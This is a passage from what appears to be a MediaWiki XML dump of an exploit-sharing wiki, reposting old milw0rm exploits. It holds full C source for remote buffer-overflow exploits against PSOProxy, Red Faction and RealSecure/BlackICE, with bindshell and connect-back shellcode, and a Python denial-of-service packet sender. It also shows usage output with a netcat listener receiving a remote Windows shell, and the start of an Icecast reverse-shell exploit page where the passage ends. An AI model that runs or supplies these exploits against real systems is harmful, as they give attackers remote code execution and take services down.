    *(long *)&amp;buffer[(targets[type].bufsize) - 8]  = 0x41414141;
    *(long *)&amp;buffer[(targets[type].bufsize) - 4]  = 0x41414141;
    }
  }

  fd = open_socket(port);

  write(fd,buffer,strlen(buffer));
  write(fd,"\n",1);
  write(fd,"\n",1);

  sleep(1);
  sh(fd);

  close(fd);
  return 0;

}


// milw0rm.com [2003-04-08]
            
&lt;/pre&gt;</text>
      <sha1>dk54tkgoqjf11s8gltibdv3l6f0m2kg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-0313 PSOProxy 0.91 (Windows 2000/XP) 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1673</id>
    <revision>
      <id>2077</id>
      <timestamp>2021-05-03T13:15:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  	 Copyright © Rosiello Security   	      http www rosiello org  	    ================   -== Remote Exploit for PSOProxy version v0.91 ==--  Code by: rave  C..."</comment>
      <origin>2077</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7246" sha1="7bcza0uwljigzf3yd3a8tw9menxygre" xml:space="preserve">==EXP==
&lt;pre&gt;
/*

	 Copyright © Rosiello Security

 	      http www rosiello org
 	    ================

 -== Remote Exploit for PSOProxy version v0.91 ==--
 Code by: rave
 Contact: rave@rosiello.org
 Date: Feb 2004
 Bug found by: Donato Ferrante

 There is a vulnerability found in the PSOProxy server.
 An attacker can execute arbitrary code exploiting remotely a buffer overflow.

	The exploit sends:

    GET / &lt;1021 x A&gt;&lt;adres of the shellcode&gt;&lt;shellcode&gt;

 This spawns a bindshell on the victim at port 28876..


 Usage &lt;C:\&gt;psoproxy-exploit.exe &lt;target host&gt; &lt;target number&gt;
 Target Number           Target Name                             Stack Adress
 =============           ===========                             ===========
 0                       Demo                                    0xBADC0DED
 1                       Windows XP Home Edtion SP1.             0x00D2FDDA
 2                       Windows XP Pro Edtion SP1.              0x00EDFDDC
 3                       Win2k Pro Edtion.                       0x00BBFDDC



 &lt;C:\&gt; psoproxy-exploit localhost 1
 [+] Winsock Inalized
 [+] Trying to connect to localhost:8080
 [+] socket inalized
 [+] Overflowing string is Prepared
 [+] Connected.
 [+] Overflowing string had been send


 &lt;C:\&gt; telnet localhost 28876
 Microsoft Windows XP [versie 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 &lt;D:\&gt;

 DO NOT USE THIS CODE ON DIFFERENT MACHINES BUT YOURS!!!
 Respect the law as we do!




   Special Tankz to:
   opy   { win2k 0wnage !! ty for lending me ur box }
   B0f   { Hope to work with u again in the futhure like we do all the time }
   Dragnet  { Always willing to help me out }
   Angelo  { Verry good maffio`so }


   Greetz go out to:
   Kajun  { Verry suportive guy }
   NrAziz { 0wns pakistan hax0r scene ! beware always say mr NrAziz }
   sloth  { good guy }
   Mercy  { Hope to see u soon }
   Netric security {www.netric.org/.de }
   [+] All the hax0rs i forgot.

   Hate Messages:
   Ziphie { U didnt get mine bitch }

  OOh and Li0n7 voila fr {
  you're doing it all wrong, your exploit doesn't work!
  http://www.securityfocus.com/archive/1/354769/2004-02-15/2004-02-21/0
  k/j man, keep on doing the good stuff and next time add some more stack adresses so
  it would work on other os`s...

  }



Advisory at: http://www.rosiello.org/en/read_bugs.php?15

*/


#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;errno.h&gt;
#include &lt;windows.h&gt;

// Darn fucking 1337 macro shit
#define ISIP(m) (!(inet_addr(m) ==-1))

#define offset 1024 //1024





struct remote_targets {
  char *os;
  unsigned long sh_addr;
} target [] ={
/* Option`s for your eyes only :D*/
    "Demo                        ",
     0xbadc0ded,


    "Windows XP Home Edtion SP1. ",
     0x00D2FDDA,

    "Windows XP Pro Edtion SP1.  ",
     0x00edfddc,


    "Win2k Pro Edtion.          ",
     0x00bbfddc,

 };






//Bindcode spawns a binshell on port 28876 (Thanks to metasploit.com guys)
unsigned char  shellcode[] =
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60"
  "\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89"
  "\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56"
  "\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53"
  "\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53"
  "\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf"
  "\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf"
  "\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff"
  "\x83\xc4\x5c\x61\xeb\x89\x41";


// now what would this button do ?
char *host_ip;
u_long get_ip(char *hostname)
{
 struct  hostent    *hp;

 if (ISIP(hostname)) return inet_addr(hostname);

  if ((hp = gethostbyname(hostname))==NULL)
  { perror ("[+] gethostbyname() failed check the existance of the host.\n");
    exit(-1); }

  return (inet_ntoa(*((struct in_addr *)hp-&gt;h_addr)));
}


/// oooh yeah uuuh right ....
int usage (char *what)
{
 int i;
  fprintf(stdout,"Copyright © Rosiello Security\n");
  fprintf(stdout,"http://www.rosiello.org\n\n");
  fprintf(stdout,"Usage %s &lt;target host&gt; &lt;target number&gt;\n",what);
  fprintf(stdout,"Target Number\t\tTarget Name\t\t\t\tStack Adress\n");
  fprintf(stdout,"=============\t\t===========\t\t\t\t===========\n");

  for (i=0;i &lt; 4;i++)
   fprintf(stdout,"%d\t\t\t%s\t\t0x%p\n",i,target[i].os,target[i].sh_addr);

  exit(0);
}

int main(int argc,char **argv)

{


char buffer[offset*2]="get /",*ptr,*address;
int sd,oops,i,choise;
struct  sockaddr_in  ooh;


WSADATA wsadata;
WSAStartup(0x101, &amp;wsadata);

if (argc &lt; 2) usage(argv[0]);
address=argv[1];
choise=atoi(argv[2]);

fprintf(stdout,"[+] Winsock Inalized\n");

 /* Lets start making a litle setup
    Change the port if you have to */

 ooh.sin_addr.s_addr = inet_addr(get_ip(address));
    ooh.sin_port        = htons(8080);
    ooh.sin_family      = AF_INET;


fprintf(stdout,"[+] Trying to connect to %s:%d\n",address,8080);


// ok ok here`s ur sock()
sd = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
 if (!sd&lt;0) { fprintf(stderr,"[!] socket() failed.\n");exit (-1); }

 fprintf(stdout,"[+] socket inalized\n");


 /* initializing the expploiting buffer, read the file comments for the details */
ptr=buffer+strlen(buffer);

for (i=strlen(buffer);i &lt; offset;i++) *ptr++=(char)0x2e;
for (i=strlen(buffer);i &lt; offset+6;i++) { *ptr++=(char)0xa; *ptr++=(char)0xd ;}

memcpy(buffer+strlen(buffer),((char *)&amp;shellcode),strlen(shellcode));
memcpy(buffer+offset,((char *)&amp;target[choise].sh_addr),3);


fprintf(stdout,"[+] Overflowing string is Prepared\n");

 // Knock knock ... hi i want to hook up with you
 oops=connect(sd, (struct sockaddr *)&amp;ooh, sizeof( ooh ));
  if(oops!=0) { fprintf(stderr,"[!] connect() failed.\n"); exit(-1); }

// yep we are in :D
fprintf(stdout,"[+] Connected.\n");


// Sending some Dangerous stuff
i = send(sd,buffer,strlen(buffer),0);
if (!i &lt;0) { fprintf (stdout,"[!] Send() failed\n"); exit (-1) ; }

fprintf(stdout,"[+] Overflowing string had been send\n");


/* May psoproxy rest in peace (have cold a nice one and telnet to &lt;host&gt;  28876

 &lt;C:\&gt; telnet localhost 28876
 Microsoft Windows XP [versie 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 D:\&gt;
*/


// the cleaners !!
WSACleanup();

// [EOF]
return 0;

}

// milw0rm.com [2004-02-26]
            
&lt;/pre&gt;</text>
      <sha1>7bcza0uwljigzf3yd3a8tw9menxygre</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-0345 Red Faction 1.20 - Server Reply 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1674</id>
    <revision>
      <id>2078</id>
      <timestamp>2021-05-03T13:16:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; /*  by Luigi Auriemma  UNIX &amp; WIN VERSION */  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  #ifdef WIN32 #include &lt;winsock.h&gt; #include "winerr.h"..."</comment>
      <origin>2078</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5660" sha1="09o51njrwn9almwwbbh4e3dt2x458nm" xml:space="preserve">==POC==
&lt;pre&gt;
/*

by Luigi Auriemma

UNIX &amp; WIN VERSION
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef WIN32
#include &lt;winsock.h&gt;
#include "winerr.h"

#define close closesocket
#else
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#endif

#define VER "0.1"
#define BUFFSZ 2048
#define PORT 7755
#define RETADDR "\xde\xc0\xad\xde" // 0xdeadc0de

void std_err(void);

int main(int argc, char *argv[]) {
int sd,
on = 1,
psz;
struct sockaddr_in peer;
u_char *buff,
info[] =
"\x00\x01" // packet number
"\x00\x00" // packet size - 4
"\x89" // version (x89 = 1.20)
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" // server name (260 bytes)
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
RETADDR "\0"
"\x00" // type of game
"\x01" // players
"\x08" // max players
"Relentless\0" // mapname
"\x00" // dunno?
"\x00"; // password:
// 4 = yes, 0 = none

setbuf(stdout, NULL);

fputs("\n"
"RedFaction &lt;= 1.20 broadcast clients buffer overflow "VER"\n"
"by Luigi Auriemma\n"
"e-mail: aluigi@altervista.org\n"
"web: http://aluigi.altervista.org\n"
"\n", stdout);

#ifdef WIN32
WSADATA wsadata;
WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

peer.sin_addr.s_addr = INADDR_ANY;
peer.sin_port = htons(PORT);
peer.sin_family = AF_INET;
psz = sizeof(peer);

printf("\nBinding UDP port %u\n", PORT);

sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(sd &lt; 0) std_err();

if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))
&lt; 0) std_err();
if(bind(sd, (struct sockaddr *)&amp;peer, psz)
&lt; 0) std_err();

buff = malloc(BUFFSZ);
if(!buff) std_err();

*(u_short *)(info + 2) = sizeof(info) - 5;

printf("Return address of clients will be overwritten with 0x%08lx\n", *(u_long *)RETADDR);

fputs("\nClients:\n", stdout);
while(1) {
if(recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;psz)
&lt; 0) std_err();

printf("%s:%hu -&gt; ", inet_ntoa(peer.sin_addr), htons(peer.sin_port));

if(sendto(sd, info, sizeof(info) - 1, 0, (struct sockaddr *)&amp;peer, psz)
&lt; 0) std_err();
fputs("BOOM\n", stdout);
}

close(sd);
return(0);
}

#ifndef WIN32
void std_err(void) {
perror("\nError");
exit(1);
}
#endif
--------------------------------------------------------------------------------------------------
//winerr.h 
/*
Header file used for manage errors in Windows
It support socket and errno too
(this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
char *error;

switch(WSAGetLastError()) {
case 10004: error = "Interrupted system call"; break;
case 10009: error = "Bad file number"; break;
case 10013: error = "Permission denied"; break;
case 10014: error = "Bad address"; break;
case 10022: error = "Invalid argument (not bind)"; break;
case 10024: error = "Too many open files"; break;
case 10035: error = "Operation would block"; break;
case 10036: error = "Operation now in progress"; break;
case 10037: error = "Operation already in progress"; break;
case 10038: error = "Socket operation on non-socket"; break;
case 10039: error = "Destination address required"; break;
case 10040: error = "Message too long"; break;
case 10041: error = "Protocol wrong type for socket"; break;
case 10042: error = "Bad protocol option"; break;
case 10043: error = "Protocol not supported"; break;
case 10044: error = "Socket type not supported"; break;
case 10045: error = "Operation not supported on socket"; break;
case 10046: error = "Protocol family not supported"; break;
case 10047: error = "Address family not supported by protocol family"; break;
case 10048: error = "Address already in use"; break;
case 10049: error = "Can't assign requested address"; break;
case 10050: error = "Network is down"; break;
case 10051: error = "Network is unreachable"; break;
case 10052: error = "Net dropped connection or reset"; break;
case 10053: error = "Software caused connection abort"; break;
case 10054: error = "Connection reset by peer"; break;
case 10055: error = "No buffer space available"; break;
case 10056: error = "Socket is already connected"; break;
case 10057: error = "Socket is not connected"; break;
case 10058: error = "Can't send after socket shutdown"; break;
case 10059: error = "Too many references, can't splice"; break;
case 10060: error = "Connection timed out"; break;
case 10061: error = "Connection refused"; break;
case 10062: error = "Too many levels of symbolic links"; break;
case 10063: error = "File name too long"; break;
case 10064: error = "Host is down"; break;
case 10065: error = "No Route to Host"; break;
case 10066: error = "Directory not empty"; break;
case 10067: error = "Too many processes"; break;
case 10068: error = "Too many users"; break;
case 10069: error = "Disc Quota Exceeded"; break;
case 10070: error = "Stale NFS file handle"; break;
case 10091: error = "Network SubSystem is unavailable"; break;
case 10092: error = "WINSOCK DLL Version out of range"; break;
case 10093: error = "Successful WSASTARTUP not yet performed"; break;
case 10071: error = "Too many levels of remote in path"; break;
case 11001: error = "Host not found"; break;
case 11002: error = "Non-Authoritative Host not found"; break;
case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
case 11004: error = "Valid name, no data record of requested type"; break;
default: error = strerror(errno); break;
}
fprintf(stderr, "\nError: %s\n", error);
exit(1);
}


// milw0rm.com [2004-03-04]
            
&lt;/pre&gt;</text>
      <sha1>09o51njrwn9almwwbbh4e3dt2x458nm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-0362 RealSecure / Blackice - 'iss pam1.dll' 遠程溢出漏洞</title>
    <ns>0</ns>
    <id>1675</id>
    <revision>
      <id>2079</id>
      <timestamp>2021-05-03T13:17:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /* 557iss_pam_exp - RealSecure / Blackice ICQ iss_pam1.dll remote overflow exploit * * Copyright (c) SST 2004 All rights reserved. * * Public version * * code by..."</comment>
      <origin>2079</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7679" sha1="6bidbs5khyvlqzfiwzu9hgcrt4wc803" xml:space="preserve">==EXP==
&lt;pre&gt;
/* 557iss_pam_exp - RealSecure / Blackice ICQ iss_pam1.dll remote overflow exploit
*
* Copyright (c) SST 2004 All rights reserved.
*
* Public version
*
* code by Sam (Sam`@efnet) and 2004/03/26 
* &lt;chen_xiaobo@venustech.com.cn&gt;
* &lt;Sam@0x557.org&gt;
* 
* 
*
* Compile: gcc -o 557iss_pam_exp 557iss_pam_exp.c
*
* how works?
* [root@core exp]# ./557iss_pam_exp 192.168.10.2 192.168.10.169 5570
* 557iss_pam_exp - RealSecure / Blackice iss_pam1.dll remote overflow exploit
* - Sam
*
* # attack remote host: 192.168.10.2.
* # listen host: 192.168.10.169.
* # listen port: 5570.
* # send overflow udp datas
* # 1199 bytes send
* # done.
* # make sure we are in, dude :)
*
*
* [root@core root]# nc -vv -l -p 5570
* listening on [any] 5570 ...
* 192.168.10.2: inverse host lookup failed: Host name lookup failure
* connect to [192.168.10.169] from (UNKNOWN) [192.168.10.2] 3604
* Microsoft Windows XP [Version 5.1.2600]
* (C) Copyright 1985-2001 Microsoft Corp.
*
* C:\Program Files\ISS\BlackICE&gt;
* C:\Program Files\ISS\BlackICE&gt;
* C:\Program Files\ISS\BlackICE&gt;
*
*
* some thanks/greets to:
* eeye (they find this bug :D), airsupply, kkqq, icbm, my gf :I
* and everyone else who's KNOW SST ;P
* http://0x557.org
*/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/time.h&gt;

char icq_header [] =
"\x05\x00" // ICQ VERSION
"\x00" // unused
"\x00\x00\x00\x00" // Session ID
"\x12\x02" // reply to SRV_MULTI_PACKET 
"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2
"\x00\x00\x00\x00" // UIN Your (the client's) UIN 
"\x00\x00\x00\x00" // CHECKCODE
"\x02" // SRV_MULTI Parameter Block 1 of 2
// Number of individual responses
"\x2c\x00" // Size of sub-response (44 bytes, little-endian) 

"\x05\x00" // ICQ VERSION
"\x00" // unused 
"\x00\x00\x00\x00" // Session ID
"\x6e\x00" // reply to SRV_USER_OLINE
"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2
"\x00\x00\x00\x00" // UIN Your (the client's) UIN
"\x00\x00\x00\x00" // CHECKCODE
"\x00\x00\x00\x00" // UIN of user changing status
"\x01\x00\x00\x00" // Other user's IP address (1.0.0.0)
"\x00\x00\x00\x00" // Other user's direct-connect port (default)
"\x00"
"\x00\x00\x00\x00"
"\x00\x00\x00\x00"
"\x00\x00"
"\x41\x02" // SRV_MULTI Parameter Block 2 of 2 
// Size of sub-response (577 bytes)

"\x05\x00" // ICQ VERSION
"\x00" // unused 
"\x00\x00\x00\x00" // Session ID
"\xde\x03" // reply to SRV_META_USER
"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2
"\x00\x00\x00\x00" // UIN Your (the client's) UIN
"\x00\x00\x00\x00" // CHECKCODE
"\x00\x00\x00\x01" 
"\x00\x00\x01\x00"
"\x00\x01\x00\x00"
"\x1e\x02";


struct sockaddr_in addr, local;
char *bindHost = NULL;
unsigned short port;
/* 
* hsj's connect back shellcodes
*/
char shellcode [] =
/* decoder */
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01"
"\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30"
"\x93\x40\xe2\xfa"
/* code */
"\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1"
"\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2"
"\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93"
"\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7"
"\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0"
"\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8"
"\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93"
"\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93"
"\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0"
"\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87"
"\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60"
"\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5"
"\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90"
"\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22"
"\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18"
"\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92"
"\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3"
"\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93"
"\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9"
"\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18"
"\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce"
"\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6"
"\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7"
"\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4"
"\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca"
"\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50";




/* udpconnect:
* 
*/
int udpConnect (char *hostName)
{

struct hostent* host = NULL;
int sock = -1;

host = gethostbyname (hostName);
if (NULL == host) {
perror ("gethostbyname() failed");
return -1;
}

sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if ( -1 == sock) {
perror ("socket() failed\n");
return -1;
}

memset (&amp;addr, 0x00, sizeof (addr));
addr.sin_addr = *(struct in_addr *) host-&gt;h_addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(random());

memset (&amp;local, 0x00, sizeof (local));
local.sin_family = AF_INET;
local.sin_addr.s_addr = htonl (INADDR_ANY);
local.sin_port = htons(4000);


if (bind (sock, (struct sockaddr *) &amp;local, sizeof(local)) != 0) {
perror ("bind error\n");
return -1;
}

return sock;
}

/* resolve listen host
*/
unsigned int resolve (char *name)
{
struct hostent *he;
unsigned int ip;

if ((ip = inet_addr (name)) == (-1)) {
if ((he = gethostbyname (name)) ==0 )
return 0;
memcpy (&amp;ip, he-&gt;h_addr, 4);
}
return ip;
}


/*
* send datas
*/
int udp_send (int sock, char *buffer, int buff_len)
{
int ret;

ret = sendto (sock, buffer, buff_len, 0, (struct sockaddr *)&amp;addr,
sizeof (struct sockaddr_in));
if (ret &lt;= NULL) {
perror ("sendto failed\n");
return -1;
}

fprintf (stderr, "# %d bytes send\n", ret);

return ret;
}

/*
* send evil datas, fuck ISS's blackice.
*/
int do_sendudp_data (char *hostName)
{
unsigned int cb;
int sock;
char expbuf[1200];

memset (expbuf, 0x90, sizeof (expbuf));
memcpy (expbuf, icq_header, sizeof (icq_header) - 1);

/*
* jmp esp opcodes from iss_pam1.dll
*/
*(unsigned int *)&amp;expbuf[637] = 0x5e077663;

if (!(cb = resolve (bindHost))) {
printf ("Unknown listen host\n");
return -1;
}
port = htons (port);
port ^= 0x9393;
cb ^= 0x93939393;

*(unsigned short *)&amp;shellcode[330] = port;
*(unsigned int *)&amp;shellcode[335] = cb;

memcpy (expbuf + 637 + 4, shellcode, strlen (shellcode));
if ((sock = udpConnect (hostName)) &lt; 0) {
printf ("connect failed\n");
exit (-1);
}

fprintf (stderr, "# send overflow udp datas\n");
udp_send (sock, expbuf, sizeof (expbuf) - 1);

close (sock);
return 0;


}


/*
* just main . dude.
*/
int main (int argc, char **argv)
{
int new;
char *target = NULL;

fprintf (stderr, "557iss_pam_exp - RealSecure / Blackice iss_pam1.dll remote overflow exploit\n - Sam\n\n");
if (argc != 4) {
fprintf (stderr, "%s &lt;hostname&gt; &lt;listenhost&gt; &lt;listen port&gt;\n", argv[0]);
fprintf (stderr, "listenhost, port: connect back host and port\n\n");
return -1;
}

target = argv[1];
bindHost = argv[2];
port = atoi (argv[3]);

fprintf (stderr, "# attack remote host: %s. \n", target);
fprintf (stderr, "# listen host: %s. \n", bindHost);
fprintf (stderr, "# listen port: %d. \n", port);
do_sendudp_data (target);

fprintf (stderr, "# done.\n");

fprintf (stderr, "# make sure we are in, dude :)\n\n");

return 0;
}

// milw0rm.com [2004-03-28]
            
&lt;/pre&gt;</text>
      <sha1>6bidbs5khyvlqzfiwzu9hgcrt4wc803</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-0558 IPP拒絕服務漏洞</title>
    <ns>0</ns>
    <id>593</id>
    <revision>
      <id>807</id>
      <timestamp>2021-03-31T07:27:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; import socket import struct from optparse import OptionParser  parser = OptionParser() parser.add_option('-t', '--target', dest='target') parser.add_option('-s',..."</comment>
      <origin>807</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="847" sha1="5khqiioly9an1lxmkwcsgrsy3i4g8ry" xml:space="preserve">==POC==
&lt;pre&gt;
import socket
import struct
from optparse import OptionParser

parser = OptionParser()
parser.add_option('-t', '--target', dest='target')
parser.add_option('-s', '--source-port', dest='source_port', default=4321)
parser.add_option('-P', '--destination-port', dest='destination_port', default=631)

(options, args) = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
target_address = options.target

def buildPacket():

    source_port = options.source_port
    destination_port = options.destination_port
    length = 8
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, destination_port, length, checksum)

    return udp_header


def sendPayload(udp_header):
    sock.sendto(udp_header,(target_address, 0))

evil_packet = buildPacket()
sendPayload(evil_packet)

&lt;/pre&gt;</text>
      <sha1>5khqiioly9an1lxmkwcsgrsy3i4g8ry</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-1561 Icecast 2.0.1任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>594</id>
    <revision>
      <id>808</id>
      <timestamp>2021-03-31T07:30:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2004-1561 Icecast Header Overwrite buffer overflow RCE &lt; 2.0.1 (Win32)  Python 3 Icecast Header Overwrite buffer overflow RCE &lt; 2.0.1 (Win32), rewritten f..."</comment>
      <origin>808</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10991" sha1="0ufu32nfkxam1r0us2b0ddldyv7vi4k" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2004-1561 Icecast Header Overwrite buffer overflow RCE &lt; 2.0.1 (Win32)

Python 3 Icecast Header Overwrite buffer overflow RCE &lt; 2.0.1 (Win32), rewritten from this [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/icecast_header.rb). I rewrote this from the Metasploit module because I couldn't get [this](https://www.exploit-db.com/exploits/568) to work.

## Usage:
Replace reverse shell shellcode in exploit, call it with argument for remote server and port.

```
root@Kali:~/TryHackme/Ice# ./icecast.py 192.168.92.133 8000

Done!
```
Reverse shell listener:
```
root@Kali:~/TryHackme/Ice# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49211
